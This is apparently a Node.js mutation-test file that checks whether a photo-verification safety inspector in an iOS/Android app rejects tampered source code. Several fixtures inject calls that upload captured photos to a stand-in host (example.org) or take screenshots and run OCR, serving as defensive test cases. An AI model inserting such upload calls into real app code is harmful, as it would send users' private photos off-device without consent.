const assert = require('node:assert/strict');
const test = require('node:test');
const { readChallengePhotoSafetySources, inspectChallengePhotoSafety } = require('../scripts/lib/challenge-photo-safety-contract');
const production = readChallengePhotoSafetySources();
function mutation(key, before, after, gate) {
  assert.ok(production[key].includes(before), `fixture exists: ${key} ${before}`);
  const changed = production[key].replace(before, after);
  assert.notEqual(changed, production[key], 'mutation must change actual production input');
  assert.equal(inspectChallengePhotoSafety({...production,[key]:changed})[gate],false,`${key}: ${before} -> ${gate}`);
}

test('photo source gate accepts current imported production path and keeps calibration distinct', () => {
  assert.deepEqual(Object.entries(inspectChallengePhotoSafety(production)).filter(([,pass])=>!pass),[]);
});

test('earned native camera path has separate source gates without replacing any legacy capture invariant', () => {
  const report=inspectChallengePhotoSafety(production);
  for(const key of ['earnedCaptureWiring','earnedNativeScopeAndReceipts','earnedNativeOwnershipAndCleanup','earnedTargetsRemainUnvalidated','earnedNoPhotoExternalFallback'])assert.equal(report[key],true,key);
});

test('selected adapter wiring rejects diverting either capture arm or replacing native callback provenance', () => {
  mutation('app','capturePhoto:nativeVerification.capturePhoto','capturePhoto:async () => {}','userCaptureWiring');
  mutation('app','}:basicVerification;', '}:({capturePhoto:async()=>{}});','userCaptureWiring');
  mutation('earnedHook','capture:captureEarnedChallengePhoto','capture:async()=>({accepted:true})','earnedCaptureWiring');
  mutation('earnedHook','createCaptureId:randomUUID','createCaptureId:()=>"photo-prefix"','earnedCaptureWiring');
  mutation('earnedHook','finish,capturePhoto,cancel:','finish,capturePhoto:async()=>{},cancel:','earnedCaptureWiring');
  mutation('iosBridge','self.photoPipeline.destroy();Task','Task','nativeDelegation');
  mutation('iosBridge','OnDestroy { self.photoPipeline.destroy();Task','OnDestroy { if false { self.photoPipeline.destroy() };Task','nativeDelegation');
});

test('earned native owner, target, nonce, receipt and cleanup fences reject actual source mutations', () => {
  mutation('earnedController','if(!current())return false;','if(false)return false;','earnedNativeScopeAndReceipts');
  mutation('earnedController','nativeEarnedEvidenceMatches(receipt,options.offer,options.session,false)','true','earnedNativeScopeAndReceipts');
  mutation('earnedController','captureOperationId:options.createCaptureId()','captureOperationId:"caller-id"','earnedNativeScopeAndReceipts');
  mutation('earnedController',"native.phase!=='active'",'false','earnedNativeScopeAndReceipts');
  mutation('earnedHook','latest.current.ownerScope===input.ownerScope','true','earnedNativeScopeAndReceipts');
  mutation('iosEarnedCamera','picker.sourceType = .camera','picker.sourceType = .photoLibrary','earnedNativeOwnershipAndCleanup');
  mutation('iosBridge','guard FreedChallengeOwnedCaptureFiles.remove(capture) else','guard true else','earnedNativeOwnershipAndCleanup');
  mutation('androidEarnedPipeline','val deleted = active.file.delete() || !active.file.exists()','val deleted = true','earnedNativeOwnershipAndCleanup');
  mutation('androidEarnedPipeline','if (deleted && revoked) outcome else "unavailable"','if (deleted) outcome else "unavailable"','earnedNativeOwnershipAndCleanup');
  mutation('androidEarnedPipeline','usedIds.size >= 128','false','earnedNativeOwnershipAndCleanup');
  mutation('iosEarnedPolicy','static let reviewedEvaluations:[FreedChallengePhotoEvaluation]=[]','static let reviewedEvaluations:[FreedChallengePhotoEvaluation]=fakePassedReceipts','earnedTargetsRemainUnvalidated');
  mutation('androidEarnedEvaluation','val reviewedTargetIds: List<String> = emptyList()','val reviewedTargetIds: List<String> = listOf("flower")','earnedTargetsRemainUnvalidated');
});

test('earned photo privacy boundaries reject relocated uploads and screenshot/OCR use without banning read-only evidence polling', () => {
  mutation('earnedHook','photoBusy.current=true;try','photoBusy.current=true;fetch("https://example.org/upload");try','earnedNoPhotoExternalFallback');
  mutation('earnedController','set({...snapshot,busy:true});','fetch("https://example.org/upload");set({...snapshot,busy:true});','earnedNoPhotoExternalFallback');
  mutation('androidEarnedPipeline','val image = InputImage.fromFilePath','Firebase.uploadFile(active.uri);val image = InputImage.fromFilePath','earnedNoPhotoExternalFallback');
  mutation('iosEarnedCamera','let picker=UIImagePickerController()','takeScreenshot();let picker=UIImagePickerController()','noScreenshotOrOcr');
  mutation('androidEarnedCamera','super.onCreate(savedInstanceState)','TextRecognition.getClient();super.onCreate(savedInstanceState)','noScreenshotOrOcr');
  mutation('earnedHook',"import React from 'react';","import React from 'react'; import './relocated-network';",'knownPhotoImports');
});

test('earned camera classification uses exact local catalog targets rather than broadened labels',()=>{
  assert.equal(inspectChallengePhotoSafety(production).earnedExactTargetProof,true);
  mutation('androidEarnedPipeline','FreedPhotoTargetMatching.matches(label.text, it)','label.text.contains(it)','earnedExactTargetProof');
  mutation('iosPipeline','expectedLabels:FreedChallengePhotoCatalog.labels[targetId] ?? []','expectedLabels:["plant"]','earnedExactTargetProof');
});

test('actual returned button, hook imports, options and single camera cannot be replaced by comments or unused declarations', () => {
  mutation('app','void verification.capturePhoto();','void 0; // void verification.capturePhoto();','userCaptureWiring');
  mutation('app','from "@/hooks/useChallengeVerification"','from "./fake-verification"','userCaptureWiring');
  mutation('hook','from "../lib/challenge-photo-files"','from "../lib/fake-files"','userCaptureWiring');
  mutation('hook','preparePhotoCapture: prepareTemporaryChallengePhotoCapture','preparePhotoCapture: () => true /* preparePhotoCapture: prepareTemporaryChallengePhotoCapture */','userCaptureWiring');
  mutation('hook','await runChallengePhotoCapture({','const unused = {','userCaptureWiring');
  mutation('hook','cancelPhoto: cancelChallengePhoto','cancelPhoto: cancelChallengePhoto, cancelPhoto: () => false','userCaptureWiring');
  mutation('hook','cancelPhoto: cancelChallengePhoto','cancelPhoto: () => false','userCaptureWiring');
  mutation('hook','photoOperationRef.current?.abort.abort();','void 0;','userCaptureWiring');
  mutation('hook','base64: false','base64: true','noPhotoExternalFallback');
});

test('current admission, authority, cancellation, deadline and provider identity failures reject source proof', () => {
  mutation('runtime',"if (!options.isCurrent()) return 'stale';","return 'matched'; if (!options.isCurrent()) return 'stale';",'runtimeReturnsActualWork');
  mutation('runtime','const work = (async () => {',"const work = Promise.resolve('matched'); const unusedWork = (async () => {",'runtimeReturnsActualWork');
  mutation('runtime','if (captureAuthority)','if (false)','admissionBeforeCamera');
  mutation('runtime','await options.preparePhotoCapture()','true','admissionBeforeCamera');
  mutation('runtime',"if (!storageReady)","if (false)",'admissionBeforeCamera');
  mutation('runtime','options.inferenceTimeoutMs ?? 8500','Infinity','deadlineCancellationIdentity');
  mutation('runtime','options.signal?.addEventListener','undefined?.addEventListener','deadlineCancellationIdentity');
  mutation('runtime','samePhotoIdentity(parsed.identity,capabilities.identity) ? parsed : unavailablePhoto()','parsed','deadlineCancellationIdentity');
  mutation('runtime','options.cancelPhoto(operationId)','undefined','deadlineCancellationIdentity');
  mutation('runtime','await options.deletePhoto(uri)','undefined','ownedCleanup');
  mutation('runtime','if (captureAuthority === authority) captureAuthority=null','captureAuthority=null','ownedCleanup');
});

test('owned-store capacity, cleanup accounting, live owner isolation and imported recovery triggers are enforced', () => {
  mutation('store',"return isDirectPhotoChild(uri, cacheUri.replace(/\\/$/, '') + '/ImagePicker/');",'return true;','freshCaptureOwnership');
  mutation('store','retained.length > maxRetained && retained.some(uri => !previous.includes(uri))','false','freshCaptureOwnership');
  mutation('files','initializationRetries.size < MAX_INITIALIZATION_RETRIES','true','freshCaptureOwnership');
  mutation('files','retryInitializationCleanup(currentStore, uri);','void 0;','ownedCleanup');
  mutation('files','retryCapacityExceeded || initializationRetries.size || cleanup.metadataUnavailable','false','admissionBeforeCamera');
  mutation('files','remaining: Math.max(1, fallbackRemaining)','remaining: 0','ownedCleanup');
  mutation('store','if (retained.length > maxRetained - 2) return false;','void 0;','ownedCleanup');
  mutation('store','save([...load(), uri, owned]);','void 0;','ownedCleanup');
  mutation('store','.filter(uri => !live.has(uri))','.filter(uri => true)','ownedCleanup');
  mutation('store','outstanding().uris.slice(0, 128)','outstanding().uris','ownedCleanup');
  mutation('store','remaining: Math.max(Number(remaining.metadataUnavailable), remaining.uris.length)','remaining: 0','ownedCleanup');
});

test('native actual delegate, module-wide queue, owner cancellation and physical drain cannot disappear', () => {
  mutation('iosBridge','self.photoPipeline.classify(uri: uri, expectedLabels: expectedLabels, operationId: operationId, promise: promise)','promise.resolve(["matched": true])','nativeDelegation');
  mutation('androidBridge','photoPipeline.classify(appContext.reactContext, uri, expectedLabels, operationId, promise)','promise.resolve(mapOf("matched" to true))','nativeDelegation');
  mutation('iosPipeline','\"provider\":\"apple-vision\"','\"provider\":\"cloud-vision\"','nativeProviderIdentity');
  mutation('androidPipeline','com.google.mlkit:image-labeling:17.0.9','com.google.mlkit:image-labeling:0.0.0','nativeProviderIdentity');
  mutation('iosPipeline','private static let physicalGate','private let physicalGate','boundedNativeOwner');
  mutation('iosPipeline','$0.ownerId == ownerId &&','true &&','boundedNativeOwner');
  mutation('iosPipeline','asyncAfter(deadline: .now() + 8)','asyncAfter(deadline: .now() + 800000)','boundedNativeOwner');
  mutation('androidPipeline','it.ownerId == ownerId &&','true &&','boundedNativeOwner');
  mutation('androidPipeline','activeLabeler.close(); gate.drain(operationId)','activeLabeler.close()','boundedNativeOwner');
  mutation('androidGate','current.id != id || !current.publishable || !accepting(current.value)','false','boundedNativeOwner');
});

test('exact label matching, calibrated NONE and actual capability eligibility cannot be broadened', () => {
  mutation('verification','return observed === expected;','return observed.includes(expected);','exactTargetProof');
  mutation('iosMatching','actual == target','actual.contains(target)','exactTargetProof');
  mutation('androidMatching','actual == target','actual.contains(target)','exactTargetProof');
  mutation('contract','available:false,matched:false,labels:[]','available:true,matched:true,labels:[]','unavailableFailsClosed');
  mutation('contract','observed.has(normalize(x))','true','unavailableFailsClosed');
  mutation('contract','validatedPhotoTargets: []','validatedPhotoTargets: v.supportedTargetIds ?? []','targetsRemainUnvalidated');
  mutation('capability',"rule?.kind === 'photo' && !capabilities.photo.validatedPhotoTargets?.includes(rule.targetId)",'false','targetsRemainUnvalidated');
});

test('forbidden APIs injected into imported helpers/native glue and protection boundaries fail intended deny gates', () => {
  for (const [key, before, code, gate] of [
    ['files','const cleanup = cleanupAbandonedChallengePhotos();','fetch("https://example.org/upload", {body: uri});','noPhotoExternalFallback'],
    ['runtime','const authority = {};','ImagePicker.launchImageLibraryAsync();','noPhotoExternalFallback'],
    ['store','const live = new Set<string>();','takeScreenshot();','noScreenshotOrOcr'],
    ['iosPipeline','let request = VNClassifyImageRequest()','URLSession.shared.uploadTask();','noPhotoExternalFallback'],
    ['androidPipeline','val operation = Operation(promise, ownerId)','Firebase.uploadFile(uri);','noPhotoExternalFallback'],
    ['iosBridge','self.photoPipeline.classify(uri: uri, expectedLabels: expectedLabels, operationId: operationId, promise: promise)','URLSession.shared.uploadTask();','noPhotoExternalFallback'],
    ['bridge','return readPhotoClassification(await module.classifyChallengePhoto(uri, expectedLabels, operationId));','fetch(uri);','noPhotoExternalFallback'],
    ['accessibility','package app.freed.protection','fun capture() { classifyChallengePhoto(uri); }','noProtectionClassification'],
    ['vpn','package app.freed.protection','fun capture() { takeScreenshot(); }','noScreenshotOrOcr'],
    ['deviceActivity','import DeviceActivity','func capture() { VNClassifyImageRequest() }','noProtectionClassification'],
    ['safariContent','"use strict"','classifyChallengePhoto(uri);','noProtectionClassification'],
  ]) mutation(key,before,`${before}\n${code}`,gate);
  mutation('files',"import { Directory, File, Paths } from 'expo-file-system';", "import { Directory, File, Paths } from 'expo-file-system';\nimport { upload } from './relocated-network';",'knownPhotoImports');
});

test('review I1 binds the returned hook property to the inspected callback and real caller scope', () => {
  const before=': "", capturePhoto, photoBusy };';
  const explicit = production.hook.replace(before, ': "", capturePhoto: capturePhoto, photoBusy };');
  assert.notEqual(explicit,production.hook);assert.equal(inspectChallengePhotoSafety({...production,hook:explicit}).userCaptureWiring,true);
  mutation('hook',before,': "", capturePhoto: async () => {}, photoBusy };','userCaptureWiring');
  mutation('hook',before,': "", capturePhoto, capturePhoto: async () => {}, photoBusy };','userCaptureWiring');
  mutation('hook',before,': "", capturePhoto, ...{capturePhoto: async () => {}}, photoBusy };','userCaptureWiring');
  mutation('hook',before,': "", capturePhoto: (() => undefined), photoBusy }; // capturePhoto','userCaptureWiring');
  mutation('hook',before,': "", capturePhoto: fakeCapturePhoto, photoBusy };','userCaptureWiring');
  mutation('hook','  const evidence = React.useMemo(', '  if (completed) return {capturePhoto: async () => {}}; const evidence = React.useMemo(','userCaptureWiring');
  mutation('hook','export function useChallengeVerification(', 'export function unusedChallengeVerification(','userCaptureWiring');
  mutation('app','void verification.capturePhoto();','verification.capturePhoto = async () => {}; void verification.capturePhoto();','userCaptureWiring');
  mutation('app','void verification.capturePhoto();','const verification = {capturePhoto: async () => {}}; void verification.capturePhoto();','userCaptureWiring');
});

test('review I2 rejects called native upload helpers outside delegation without banning unrelated DNS network code', () => {
  const swiftHelper = `\n  private func uploadCapturedPhoto(_ uri: String) {\n    var request = URLRequest(url: URL(string: "https://example.org/upload")!)\n    request.httpMethod = "POST"\n    URLSession.shared.uploadTask(with: request, fromFile: URL(string: uri)!).resume()\n  }\n`;
  const kotlinHelper = `\n  private fun uploadCapturedPhoto(uri: String) {\n    val request = java.net.URL("https://example.org/upload").openConnection()\n    request.getOutputStream().write(uri.toByteArray())\n  }\n`;
  for (const [key, delegate, helper, call] of [
    ['iosBridge','self.photoPipeline.classify(uri: uri, expectedLabels: expectedLabels, operationId: operationId, promise: promise)',swiftHelper,'self.uploadCapturedPhoto(uri)'],
    ['androidBridge','photoPipeline.classify(appContext.reactContext, uri, expectedLabels, operationId, promise)',kotlinHelper,'uploadCapturedPhoto(uri)'],
  ]) {
    assert.ok(production[key].includes(delegate));
    const commented = production[key].replace(delegate,`/* ${call} */\n${delegate}`);
    assert.notEqual(commented,production[key]);assert.equal(inspectChallengePhotoSafety({...production,[key]:commented}).noPhotoExternalFallback,true);
    const withUnrelated = production[key]+helper;
    assert.notEqual(withUnrelated,production[key]);
    assert.equal(inspectChallengePhotoSafety({...production,[key]:withUnrelated}).noPhotoExternalFallback,true,`${key}: uncalled unrelated network helper`);
    const called = withUnrelated.replace(delegate,`${call}\n${delegate}`);
    assert.notEqual(called,withUnrelated);
    assert.equal(inspectChallengePhotoSafety({...production,[key]:called}).noPhotoExternalFallback,false,`${key}: called private upload helper`);
    for (const otherCall of ['anotherPrivateHelper(uri)','helper(uri) { true }']) {
      const changed=production[key].replace(delegate,`${otherCall}\n${delegate}`);assert.notEqual(changed,production[key]);
      assert.equal(inspectChallengePhotoSafety({...production,[key]:changed}).noPhotoExternalFallback,false,`${key}: unreviewed callable`);
    }
  }
});
